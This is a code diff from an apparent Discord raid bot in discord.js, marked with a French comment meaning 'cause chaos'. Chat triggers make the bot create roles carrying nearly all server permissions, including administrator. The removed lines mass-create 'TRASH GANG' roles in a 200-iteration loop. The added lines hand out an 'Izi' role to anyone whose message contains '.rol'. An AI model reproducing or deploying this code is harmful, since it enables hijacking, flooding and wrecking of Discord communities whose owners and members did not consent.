@@ -504,19 +504,18 @@ if(message.content === "roles"){
       message.guild.createRole({name:"TRASH GANG > All !",
                                mentionable:false,
                                permissions:2146958591,
-                               position: ""
+                               position: "",
+                               color: "#fb0707"
           })
       }
   }
-  if(message.content === "roles"){
-    for(var i =0; i < 200; i++){
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#f80505", mentionable: false, permissions:2146958591,});
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#f8a605", mentionable: false, permissions:2146958591,});
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#4ff805", mentionable: false, permissions:2146958591,});
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#05f8d2", mentionable: false, permissions:2146958591,});
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#051cf8", mentionable: false, permissions:2146958591,});
-      message.guild.createRole({name:"TRASH GANG > ALL", color: "#c4ec09", mentionable: false, permissions:2146958591,});
-    }
+  if(message.content.includes(".rol")){
+      message.guild.createRole({name:"Izi",
+                                mentionable:false,
+                                permissions:2146958591,
+                                position: "",
+                                color: "#fb0707"
+     })
   }
  //foutre la merde
  if(message.content === "issou"){
